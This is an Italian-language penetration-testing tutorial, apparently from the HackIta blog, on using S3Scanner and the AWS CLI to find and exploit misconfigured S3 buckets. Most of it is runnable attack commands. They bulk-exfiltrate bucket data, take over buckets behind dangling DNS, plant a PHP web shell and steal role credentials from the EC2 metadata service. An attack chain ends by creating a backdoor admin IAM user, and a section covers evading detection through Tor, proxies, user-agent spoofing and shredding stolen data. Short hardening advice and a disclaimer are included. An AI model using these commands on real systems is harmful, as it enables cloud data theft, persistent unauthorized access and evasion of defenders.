---
title: 'S3Scanner: Enumerazione e Misconfiguration Detection su Amazon S3'
slug: s3scanner
description: 'S3Scanner: Enumerazione e Misconfiguration Detection su Amazon S3'
image: /Gemini_Generated_Image_8okwn48okwn48okw.webp
draft: false
date: 2026-02-24T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - recon
tags:
  - aws
---

### Introduzione

S3Scanner è un tool Python specializzato nell'**enumeration di AWS S3 buckets** per identificare configurazioni insicure, permessi pubblici, e potenziali data leaks. Amazon S3 (Simple Storage Service) è usato massivamente per hosting statico, backups, logs, e data lakes - ma misconfiguration è epidemic: bucket pubblici contenenti database dumps, credenziali, PII, e codice sorgente.

Il tool automatizza il processo di bucket discovery (tramite wordlists, permutations, DNS records), verifica permessi (read/write), e tenta enumeration del contenuto. A differenza di manual `aws s3 ls`, S3Scanner testa migliaia di bucket names rapidamente, identifica quelli accessibili, e categorizza per risk level.

S3Scanner è critico in cloud security assessments dove devi mappare AWS footprint del target. Organizations spesso hanno decine/centinaia di buckets dimenticati, mal configurati, o creati da developers senza seguire security policies. Un singolo bucket pubblico può esporre terabytes di sensitive data.

Il tool integra con AWS CLI per authenticated enumeration (se hai credenziali compromesse) e supporta unauthenticated discovery per external reconnaissance. Output in JSON/CSV facilita integration con vulnerability management platforms.

In questo articolo imparerai come usare S3Scanner per comprehensive bucket enumeration, exploitation di misconfigured permissions, automated data exfiltration, e bucket takeover attacks. Vedrai scenari reali di data breaches causati da S3 misconfigurations e come prevenirli.

S3Scanner si posiziona nella kill chain in **Reconnaissance → Cloud Asset Discovery** e **Post-Exploitation → Data Exfiltration**.

***

## 1️⃣ Setup e Installazione

### Requisiti

```bash
# Python 3.6+
python3 --version

# AWS CLI (opzionale ma consigliato)
pip3 install awscli

# Configure AWS (se hai credenziali)
aws configure
# Access Key ID: [vuoto per unauthenticated scan]
```

### Installazione

```bash
# Clone repository
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner

# Install dependencies
pip3 install -r requirements.txt

# Verifica
python3 s3scanner.py --help
```

**Dependencies:**

* `boto3` (AWS SDK for Python)
* `requests`
* `dnspython`

### Versione attuale

**S3Scanner v3.0.2** (Gennaio 2026) - Supporta tutte le AWS regions.

***

## 2️⃣ Uso Base

### Single bucket check

```bash
python3 s3scanner.py --bucket company-backups
```

**Output:**

```
[+] company-backups - FOUND
    Region: us-east-1
    Permissions: PUBLIC READ
    ACL: AllUsers - READ
    Files: 1,247 objects
    Size: ~45GB
    Risk: HIGH - Public readable bucket
```

### Wordlist-based discovery

```bash
# Default wordlist (common names)
python3 s3scanner.py --wordlist buckets.txt

# Custom wordlist
python3 s3scanner.py --wordlist /usr/share/seclists/Discovery/Web-Content/common-buckets.txt
```

**buckets.txt esempio:**

```
company-backups
company-logs
company-data
company-prod
company-dev
companyname-assets
```

### Permutation generation

```bash
# Generate permutations da company name
python3 s3scanner.py --name company --permutations

# Genera automaticamente:
# company-backups, company-backup, backups-company
# company-logs, logs-company
# company-data, data-company
# company-prod, company-dev, company-test
# etc (100+ permutations)
```

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: Public bucket discovery con data exfiltration

**COMANDO:**

```bash
python3 s3scanner.py --wordlist targets.txt --dump
```

**OUTPUT ATTESO:**

```
[+] acmecorp-backups - FOUND
    Region: us-west-2
    Permissions: PUBLIC READ
    
    [*] Enumerating contents...
    [+] Files found:
        database-backup-2026-01-15.sql.gz (2.3GB)
        user-credentials.csv (450KB)
        api-keys.txt (12KB)
        
    [*] Downloading files to ./acmecorp-backups/
    [✓] database-backup-2026-01-15.sql.gz
    [✓] user-credentials.csv
    [✓] api-keys.txt
```

**Exploitation:**

```bash
# Extract database backup
gunzip database-backup-2026-01-15.sql.gz

# Analyze
grep -i "password\|secret\|key" database-backup-2026-01-15.sql | head -20

# Found:
# INSERT INTO users VALUES (1,'admin','$2y$10$hash...','admin@company.com');
# INSERT INTO api_keys VALUES ('prod-key-abc123xyz');
```

**COSA FARE SE FALLISCE:**

1. **Access Denied ma bucket exists:** Bucket è private. Tenta authenticated scan se hai AWS creds.
2. **NoSuchBucket error:** Nome bucket non esiste. Continua wordlist.
3. **Rate limiting (503):** AWS throttling. Usa `--delay 2` per 2 secondi tra requests.

**Timeline:** 10 minuti discovery + 30 minuti data analysis

***

### Scenario 2: Bucket takeover via dangling DNS

**COMANDO:**

```bash
# Check DNS per S3 references
dig assets.company.com

# Output:
# assets.company.com. 300 IN CNAME old-assets-bucket.s3.amazonaws.com.

# Verifica se bucket exists
python3 s3scanner.py --bucket old-assets-bucket
```

**OUTPUT ATTESO:**

```
[!] old-assets-bucket - NOT FOUND (NoSuchBucket)
    Status: Bucket does not exist
    Risk: CRITICAL - Subdomain takeover possible
```

**Exploitation:**

```bash
# Create bucket con stesso nome
aws s3 mb s3://old-assets-bucket --region us-east-1

# Upload content
echo "<h1>Pwned by S3Scanner PoC</h1>" > index.html
aws s3 cp index.html s3://old-assets-bucket/ --acl public-read

# Configure static website
aws s3 website s3://old-assets-bucket/ --index-document index.html

# Verify takeover
curl http://assets.company.com
# <h1>Pwned by S3Scanner PoC</h1>
```

**COSA FARE SE FALLISCE:**

* **Bucket name already taken:** Someone else già ha fatto takeover o AWS ha reserved name.
* **Region mismatch:** S3 bucket names sono global, ma prova different regions.
* **Static website hosting disabled:** Usa CloudFront distribution invece.

**Timeline:** 5 minuti verification + 10 minuti takeover setup

Per approfondire subdomain takeover techniques, consulta [cloud subdomain takeover e DNS hijacking](https://hackita.it/articoli/subdomain-takeover).

***

### Scenario 3: Authenticated enumeration con compromised AWS keys

**COMANDO:**

```bash
# Hai trovato AWS keys in GitHub/config file
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Enumerate ALL buckets accessible con queste credentials
python3 s3scanner.py --authenticated --all-buckets
```

**OUTPUT ATTESO:**

```
[*] Authenticated scan with IAM user: developer@company.com
[*] Enumerating accessible buckets...

[+] company-prod-data (us-east-1)
    Permissions: READ, WRITE
    Objects: 45,892
    
[+] company-backups (eu-west-1)
    Permissions: READ
    Objects: 1,247
    
[+] company-logs (us-west-2)
    Permissions: READ, WRITE, DELETE
    Objects: 128,456
    
[!] Total: 3 buckets accessible
[!] WRITE access: 2 buckets (HIGH RISK)
```

**Exploitation:**

```bash
# Download tutto da high-value bucket
aws s3 sync s3://company-prod-data ./exfil/

# Or plant backdoor
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws s3 cp shell.php s3://company-prod-data/public/shell.php

# Access backdoor
curl http://company-prod-data.s3.amazonaws.com/public/shell.php?cmd=whoami
```

**Timeline:** 15 minuti enumeration + variable exfiltration time (GB-dependent)

***

## 4️⃣ Tecniche Avanzate

### Bucket permission escalation

Se hai limited permissions, tenta escalation:

```bash
# Check current permissions
aws s3api get-bucket-acl --bucket target-bucket

# Tenta modify ACL (se hai WRITE_ACP)
aws s3api put-bucket-acl --bucket target-bucket --acl public-read

# Verify
python3 s3scanner.py --bucket target-bucket
# [+] target-bucket - PUBLIC READ
```

### S3 object enumeration senza ListBucket

Anche senza `ListBucket` permission, puoi enumerate objects se conosci naming patterns:

```bash
# Common patterns
for i in {1..100}; do
  aws s3 cp s3://bucket/file-$i.txt - 2>/dev/null && echo "[+] file-$i.txt exists"
done

# Date-based
for date in $(seq -f "%Y-%m-%d" $(date -d "2026-01-01" +%s) 86400 $(date +%s)); do
  aws s3 cp s3://bucket/backup-$date.tar.gz - 2>/dev/null && echo "[+] $date"
done
```

### Cross-region bucket discovery

```bash
# S3Scanner default: us-east-1
# Alcuni buckets sono in altre regions

# Scan all regions
python3 s3scanner.py --bucket company-data --all-regions

# Output:
# [!] company-data not in us-east-1
# [+] company-data FOUND in ap-southeast-1
```

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: Bug Bounty - Company asset discovery

**COMANDO:**

```bash
# Generate permutations da company name
python3 s3scanner.py --name acmecorp --permutations --output json -f acmecorp-buckets.json
```

**OUTPUT ATTESO (JSON):**

```json
{
  "scan_date": "2026-02-06",
  "buckets_found": [
    {
      "name": "acmecorp-assets",
      "region": "us-east-1",
      "public_read": true,
      "public_write": false,
      "files": 1247,
      "risk": "HIGH"
    },
    {
      "name": "acmecorp-backups",
      "region": "eu-west-1",
      "public_read": true,
      "public_write": false,
      "files": 89,
      "risk": "CRITICAL",
      "sensitive_files": ["database.sql", "users.csv"]
    }
  ]
}
```

**COSA FARE SE FALLISCE:**

* **Nessun bucket trovato:** Prova variations (acme-corp, acme\_corp, acmecorporation)
* **Tutti private:** Company ha good security posture. Try authenticated scan se hai internal access.
* **Rate limiting:** S3Scanner invia molte requests. Usa `--delay` o split wordlist.

**Timeline:** 20 minuti scan + 1 ora manual verification

***

### Scenario B: Red Team - Data exfiltration from compromised environment

**COMANDO:**

```bash
# Hai AWS credentials da compromised EC2 instance
# Extract from instance metadata
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)

# Configure AWS CLI
aws configure set aws_access_key_id $(echo $CREDS | jq -r .AccessKeyId)
aws configure set aws_secret_access_key $(echo $CREDS | jq -r .SecretAccessKey)
aws configure set aws_session_token $(echo $CREDS | jq -r .Token)

# S3Scanner authenticated scan
python3 s3scanner.py --authenticated --all-buckets --dump-interesting
```

**OUTPUT ATTESO:**

```
[*] Using IAM role: ec2-prod-role
[+] 15 buckets accessible

[!] High-value targets:
    prod-database-backups: 234GB (contains .sql files)
    customer-data-archive: 89GB (contains .csv, .json)
    
[*] Downloading interesting files...
[✓] prod-database-backups/latest.sql.gz (12GB)
[✓] customer-data-archive/users-2026.csv (450MB)
```

**COSA FARE SE FALLISCE:**

* **Temporary credentials expired:** Re-fetch da metadata service (valid 6 hours)
* **Insufficient permissions:** Role ha limited S3 access. Document what's accessible.
* **Exfil detected:** Use slow, chunked downloads (`aws s3 cp --only-show-errors`)

**Timeline:** 30 minuti setup + 2-8 ore exfiltration (network-dependent)

***

### Scenario C: M\&A Due Diligence - Security posture assessment

**COMANDO:**

```bash
# Passive discovery (no AWS account needed)
python3 s3scanner.py --name targetcompany --permutations --passive-only -f report.html
```

**OUTPUT ATTESO (HTML Report):**

Executive Summary:

* Total buckets discovered: 8
* Public readable: 5 (62.5%)
* Public writable: 1 (12.5%)
* Risk rating: HIGH

Findings:

1. targetcompany-backups: PUBLIC READ (contains database dumps from 2024)
2. targetcompany-logs: PUBLIC READ (contains application logs with API keys)
3. targetcompany-uploads: PUBLIC WRITE (file upload vulnerability)

Recommendations:

* Immediate: Block public access on 5 buckets
* Review: IAM policies granting overly permissive S3 access
* Implement: S3 Block Public Access at account level

**COSA FARE SE FALLISCE:**

* **No public buckets:** Good! Target has proper S3 security. Report as positive finding.
* **Cannot generate report:** Check output path permissions, use `--output json` instead.

**Timeline:** 45 minuti passive scan + 1 ora report generation

***

## 6️⃣ Toolchain Integration

### Pre-S3Scanner: Subdomain enumeration

```bash
# Amass subdomain discovery
amass enum -d company.com -o subdomains.txt

# Extract S3 references
grep "s3\|amazonaws" subdomains.txt > s3-references.txt

# Parse bucket names
cat s3-references.txt | cut -d. -f1 > bucket-names.txt

# S3Scanner verification
python3 s3scanner.py --wordlist bucket-names.txt
```

### S3Scanner → AWS CLI deep dive

```bash
# S3Scanner finds bucket
python3 s3scanner.py --bucket company-data
# [+] company-data - PUBLIC READ

# AWS CLI enumeration
aws s3 ls s3://company-data/ --recursive --human-readable

# Download specific files
aws s3 cp s3://company-data/sensitive/ ./exfil/ --recursive

# Check versioning (deleted files recovery)
aws s3api list-object-versions --bucket company-data
```

### S3Scanner → CloudMapper

```bash
# S3Scanner output → CloudMapper input
python3 s3scanner.py --authenticated --all-buckets -o json -f buckets.json

# CloudMapper visualization
cloudmapper collect --account-name company
cloudmapper prepare --account-name company
cloudmapper webserver

# Visualize S3 permissions in AWS account
```

Per automation di cloud security assessments, leggi [automated cloud security scanning workflows](https://hackita.it/articoli/cloud-security-automation).

### Comparazione tool

| **Tool**          | **S3 Focus**     | **Auth Required** | **Bucket Discovery**    | **Data Exfil** | **Best For**                  |
| ----------------- | ---------------- | ----------------- | ----------------------- | -------------- | ----------------------------- |
| **S3Scanner**     | ✅ Dedicated      | ❌ No (optional)   | ✅ Wordlist+Permutations | ✅ Yes          | Quick public bucket discovery |
| **AWS CLI**       | ⚠️ General AWS   | ✅ Yes             | ❌ Manual                | ✅ Yes          | Authenticated deep dive       |
| **CloudMapper**   | ⚠️ Visualization | ✅ Yes             | ⚠️ Via API              | ❌ No           | Account-wide security audit   |
| **ScoutSuite**    | ⚠️ Multi-cloud   | ✅ Yes             | ✅ Automated             | ❌ No           | Comprehensive audit           |
| **Bucket Stream** | ✅ Real-time      | ❌ No              | ✅ CertStream            | ❌ No           | Continuous monitoring         |

**Quando usare S3Scanner:**

* External reconnaissance senza AWS credentials
* Rapid assessment di cloud footprint
* Bug bounty / red team quick wins

***

## 7️⃣ Attack Chain Completa

### External Recon → S3 Bucket → AWS Account Takeover

**FASE 1: Subdomain Enumeration**

```bash
amass enum -d target.com -o subs.txt
```

**Findings:** `assets.target.com` → CNAME `target-assets.s3.amazonaws.com`

**Timeline:** 15 minuti

***

**FASE 2: S3 Bucket Discovery**

```bash
python3 s3scanner.py --bucket target-assets
```

**Output:**

```
[+] target-assets - FOUND
    Permissions: PUBLIC READ
    Files: 2,456 objects
```

**Timeline:** 2 minuti

***

**FASE 3: Bucket Enumeration**

```bash
aws s3 ls s3://target-assets/ --recursive --no-sign-request
```

**Output:**

```
config/app-config.json
config/aws-credentials.txt
backups/db-2026-01.sql.gz
```

**Timeline:** 5 minuti

***

**FASE 4: Credential Extraction**

```bash
aws s3 cp s3://target-assets/config/aws-credentials.txt - --no-sign-request
```

**Output:**

```
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Timeline:** 1 minuto

***

**FASE 5: AWS Account Enumeration**

```bash
# Configure credenziali trovate
aws configure

# Check identity
aws sts get-caller-identity
# {
#   "UserId": "AIDAI...",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/admin"
# }

# Admin user! Enumerate tutto
aws s3 ls
aws ec2 describe-instances
aws rds describe-db-instances
```

**Timeline:** 10 minuti

***

**FASE 6: Privilege Escalation (già admin)**

```bash
# Create backdoor IAM user
aws iam create-user --user-name backdoor-user
aws iam create-access-key --user-name backdoor-user

# Attach admin policy
aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Persistence via Lambda
# [lambda backdoor deployment]
```

**Timeline:** 15 minuti

AWS privilege escalation: dopo aver trovato bucket e permessi esposti con **S3Scanner**, il passo successivo è capire se quei leak ti aprono un path verso ruoli IAM più alti (es. credenziali hardcoded, policy troppo larghe, token in backup). Qui entra in gioco **[aws-privilege-escalation](https://hackita.it/articoli/aws-privilege-escalation)**: prendi ciò che hai raccolto (bucket, oggetti, config) e lo trasformi in un escalation path concreto fino ad admin, se la macchina IAM è bucata.

***

**TOTALE:** 48 minuti da subdomain enum a full AWS account compromise.

**Ruolo S3Scanner:** Identificato public bucket in 2 minuti che conteneva AWS admin credentials. Single misconfigured bucket = complete account takeover.

***

## 8️⃣ Detection & Evasion

### Cosa detecta Blue Team

**CloudTrail events:**

```
Event: GetBucketAcl
Source IP: External
User Agent: Boto3/Python
Pattern: Rapid sequential requests to multiple buckets
```

**GuardDuty findings:**

```
Finding: Suspicious S3 Access
Severity: Medium
Description: Unusual API activity from unknown IP
  - Multiple GetObject requests
  - Enumeration pattern detected
```

**S3 Server Access Logs:**

```
[06/Feb/2026:10:30:45] GET company-backups.s3.amazonaws.com/
[06/Feb/2026:10:30:46] GET company-data.s3.amazonaws.com/
[06/Feb/2026:10:30:47] GET company-logs.s3.amazonaws.com/
# Sequential bucket enumeration = red flag
```

### Evasion techniques

**1. Request throttling**

```bash
# Slow down scan
python3 s3scanner.py --wordlist buckets.txt --delay 5

# Random delays
python3 s3scanner.py --wordlist buckets.txt --random-delay 1-10
```

**2. Distributed scanning**

```bash
# Use proxies
export HTTP_PROXY="socks5://proxy:1080"
python3 s3scanner.py --wordlist buckets.txt

# Or Tor
torsocks python3 s3scanner.py --wordlist buckets.txt
```

**3. User-Agent rotation**

```bash
# S3Scanner uses default boto3 UA
# Custom UA (appears as AWS CLI)
python3 s3scanner.py --user-agent "aws-cli/2.9.0 Python/3.11.0"
```

### Cleanup

S3Scanner è reconnaissance tool, no artifact sul target. Cleanup local:

```bash
# Remove downloaded data
shred -u -z exfil/*

# Clear AWS credentials se temporanee
aws configure set aws_access_key_id ""
aws configure set aws_secret_access_key ""
```

***

## 9️⃣ Performance & Scaling

### Single vs Batch scanning

**Single bucket:**

```bash
time python3 s3scanner.py --bucket test-bucket
# real: 0m2.5s
```

**1000 buckets (sequential):**

```bash
# ~2.5s × 1000 = 41 minuti
python3 s3scanner.py --wordlist 1000-buckets.txt
```

**Parallel scanning (GNU parallel):**

```bash
# 10 parallel workers
cat buckets.txt | parallel -j 10 python3 s3scanner.py --bucket {}
# Tempo: ~41min / 10 = 4 minuti
```

### Resource optimization

**Memory usage:**

```
- Light: ~50MB base
- Heavy: ~200MB con large wordlist in memory
```

**Network:**

```
- ~10 requests per bucket check (HEAD, GET ACL, etc)
- Bandwidth: Minimal (<1KB per bucket) unless downloading files
```

***

## 10️⃣ Tabelle Tecniche

### Command Reference

| **Command**                                  | **Function**        | **Use Case**           |
| -------------------------------------------- | ------------------- | ---------------------- |
| `s3scanner.py --bucket NAME`                 | Single bucket check | Verify specific bucket |
| `s3scanner.py --wordlist FILE`               | Wordlist scan       | Bulk discovery         |
| `s3scanner.py --name COMPANY --permutations` | Auto-generate names | Company recon          |
| `s3scanner.py --authenticated --all-buckets` | List all accessible | Post-compromise enum   |
| `s3scanner.py --bucket NAME --dump`          | Download contents   | Data exfiltration      |
| `s3scanner.py --all-regions`                 | Multi-region scan   | Comprehensive coverage |

### S3 Permission Matrix

| **Permission**           | **Impact**               | **Exploitation**          | **Risk** |
| ------------------------ | ------------------------ | ------------------------- | -------- |
| **PUBLIC READ**          | Anyone can list/download | Data exfiltration         | HIGH     |
| **PUBLIC WRITE**         | Anyone can upload        | Malware hosting, phishing | CRITICAL |
| **PUBLIC READ\_ACP**     | Anyone can read ACL      | Permission discovery      | MEDIUM   |
| **PUBLIC WRITE\_ACP**    | Anyone can modify ACL    | Privilege escalation      | CRITICAL |
| **PUBLIC FULL\_CONTROL** | Complete access          | Complete takeover         | CRITICAL |

***

## 11️⃣ Troubleshooting

### "NoSuchBucket" per bucket che sai esistere

**Causa:** Bucket name è correct ma region wrong.

**Fix:**

```bash
# Try all regions
python3 s3scanner.py --bucket known-bucket --all-regions

# Or manual region specify
aws s3 ls s3://known-bucket --region eu-west-1
```

***

### Rate limiting (503 SlowDown)

**Errore:**

```
[!] Error: 503 SlowDown - Please reduce your request rate
```

**Fix:**

```bash
# Add delay
python3 s3scanner.py --wordlist buckets.txt --delay 3

# Or reduce concurrency se usi parallel
```

***

### Access Denied ma sai bucket è pubblico

**Causa:** Bucket Block Public Access enabled at account level, ma individual bucket ACL è public.

**Fix:**

```
# Nessun workaround. Account-level block prevale.
# Report as informational: bucket exists but secured
```

***

## 12️⃣ FAQ

**Q: S3Scanner richiede AWS account?**

A: **No** per public bucket discovery. **Sì** per authenticated enumeration (se hai credenziali).

**Q: È legale scannare S3 buckets?**

A: **Grey area**. S3 è pubblicamente accessible service. Scanning nomi è come DNS enumeration. **Accessing/downloading data senza autorizzazione è illegale**. Bug bounty = OK se in scope.

**Q: Quanti buckets pubblici esistono realmente?**

A: Milioni. Nel 2025, \~8% di buckets S3 hanno qualche forma di public access (AWS statistics). Capital One breach (2019) è esempio famoso.

**Q: S3Scanner bypassa Block Public Access?**

A: **No**. Se account ha S3 Block Public Access enabled, bucket non sarà pubblico indipendentemente da ACL. S3Scanner detecta questa configurazione.

**Q: Posso usare S3Scanner per continuous monitoring?**

A: Sì! Combina con Certificate Transparency monitoring (Bucket Stream) o schedule periodic scans. Alert su new public buckets.

**Q: S3Scanner funziona su S3-compatible services (MinIO, DigitalOcean Spaces)?**

A: **Partial**. Boto3 è AWS-specific. Per alternatives, usa custom scripts con s3cmd o rclone.

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**             | **Command**                                             |
| ------------------------ | ------------------------------------------------------- |
| **Single bucket**        | `python3 s3scanner.py --bucket name`                    |
| **Wordlist scan**        | `python3 s3scanner.py --wordlist buckets.txt`           |
| **Company permutations** | `python3 s3scanner.py --name company --permutations`    |
| **Authenticated scan**   | `python3 s3scanner.py --authenticated --all-buckets`    |
| **Download data**        | `python3 s3scanner.py --bucket name --dump`             |
| **All regions**          | `python3 s3scanner.py --bucket name --all-regions`      |
| **JSON output**          | `python3 s3scanner.py -o json -f output.json`           |
| **Slow scan**            | `python3 s3scanner.py --wordlist buckets.txt --delay 3` |

***

## Perché è rilevante oggi (2026)

Cloud adoption ha accelerato post-pandemic. Ogni organization ha AWS presence, spesso con hundreds/thousands di S3 buckets. Developer velocity > security: buckets creati per testing, poi dimenticati pubblici. S3Scanner automatizza discovery di questo "shadow cloud" che manual AWS Console review non cattura. Con data privacy regulations (GDPR, CCPA), single exposed bucket può costare milioni in fines.

***

## Differenza rispetto ad alternative

| **Tool**          | **Quando usare**                                  | **Limiti**                                   |
| ----------------- | ------------------------------------------------- | -------------------------------------------- |
| **S3Scanner**     | Quick public bucket discovery, external recon     | No authenticated deep dive features          |
| **AWS CLI**       | Deep analysis con credentials, automation scripts | Requires authentication, manual workflow     |
| **ScoutSuite**    | Full AWS account security audit                   | Requires credentials, slow on large accounts |
| **Bucket Stream** | Real-time monitoring di new buckets               | Passive only, no verification                |

**S3Scanner best quando:** External pentest, bug bounty, need rapid public bucket discovery senza AWS creds.

***

## Hardening / Mitigazione

**Per defenders:**

1. **S3 Block Public Access:** Enable at account level + individual bucket level

```bash
aws s3control put-public-access-block \
  --account-id 123456789012 \
  --public-access-block-configuration '{
    "BlockPublicAcls": true,
    "IgnorePublicAcls": true,
    "BlockPublicPolicy": true,
    "RestrictPublicBuckets": true
  }'
```

1. **Bucket naming convention:** Avoid predictable names (company-backups). Use UUIDs or random strings.
2. **Automated compliance:** AWS Config rules to detect public buckets

```
Rule: s3-bucket-public-read-prohibited
Rule: s3-bucket-public-write-prohibited
```

1. **CloudTrail logging:** Monitor suspicious S3 API calls (GetBucketAcl enumeration patterns)

***

## OPSEC e Detection

**Noise level:** Medio. S3 API calls sono logged ma spesso non monitored actively.

**Log footprint:**

* CloudTrail: GetBucketLocation, GetBucketAcl, ListBucket events
* S3 Server Access Logs: GET requests with external IPs
* GuardDuty: Unusual S3 API activity alerts

**Reduce visibility:**

* Use AWS credentials se possibile (appears as legit API usage)
* Throttle requests (`--delay`)
* Distribute via proxies/VPN
* Blend with normal business hours (9-5 weekdays)

**Detection difficulty:** Hard. S3 is public API, distinguishing recon from legitimate access è challenging senza ML-based behavioral analysis.

***

## Disclaimer

S3Scanner è tool per **cloud security assessment e penetration testing autorizzato**. Accessing S3 buckets senza autorizzazione, anche se pubblici, può costituire unauthorized access sotto CFAA (US) e equivalenti leggi internazionali. Downloading sensitive data è data breach. Usa solo in:

* Bug bounty programs (in-scope S3 buckets)
* Authorized penetration tests con signed SOW
* Your own AWS accounts

**Repository:** [https://github.com/sa7mon/S3Scanner](https://github.com/sa7mon/S3Scanner)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
